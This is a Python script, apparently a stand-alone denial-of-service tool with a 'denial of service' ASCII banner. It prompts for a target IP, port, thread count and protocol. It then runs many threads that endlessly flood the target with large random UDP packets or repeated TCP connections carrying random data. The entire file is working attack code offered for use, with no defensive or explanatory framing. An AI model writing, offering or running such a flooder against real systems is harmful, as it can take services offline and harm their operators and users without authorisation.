import threading
import random
import sys
import os
import socket
import fade

banner = '''
    .===========.        
    |   |       |        
    |  /|\\      |    denial
    | /a|d\\     |    of      4
    |___________|    service
    |_________-_|_,-.    
   [_____________]   )   
   .,,,,,,,,,, ,,.  (_   
  /,,,,,,,,,,, ,,,\\ (>`\\ 
 (______.-``-._____) \\__)
'''

def udp_flood(ip, port, size):
    num = 0
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
                udp.sendto(random._urandom(size), (ip, port))
                num += 1
                print(f" connections: {num}                    ", end='\r')
        except socket.error as e:
            print(f" error: {e}", end='\r')
        except Exception as e:
            print(f" error: {e}", end='\r')

def tcp_flood(ip, port, size):
    num = 0
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
                tcp.connect((ip, port))
                tcp.send(random._urandom(size))
                num += 1
                print(f" connections: {num}                    ", end='\r')
        except socket.error as e:
            print(f" error: {e}", end='\r')
        except Exception as e:
            print(f" error: {e}", end='\r')

def validate_ip(ip_address):
    try:
        socket.inet_aton(ip_address)
        return True
    except socket.error:
        return False

def validate_port(port_number):
    return 0 <= port_number <= 65535

def main():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(fade.purpleblue(banner))
        target_ip = input(" target: ")
        target_port = int(input(" port: "))
        threads = int(input(" threads: "))
        protocol = input(" protocol (tcp/udp): ").lower()
        size = 65500

        if not validate_ip(target_ip):
            print(" error: invalid ip address")
            sys.exit(1)
        if not validate_port(target_port):
            print(" error: invalid port number, must be between 0 and 65535.")
            sys.exit(1)

    except Exception as e:
        print(f"\n error: {e}")
        sys.exit()

    function = udp_flood if protocol == 'udp' else tcp_flood if protocol == 'tcp' else None
    if not function:
        print(" protocol: invalid")
        sys.exit(1)

    for _ in range(threads):
        try:
            threading.Thread(target=function, args=(target_ip, target_port, size)).start()
        except Exception as e:
            print(f"\n error: {e}")

if __name__ == "__main__":
    main()
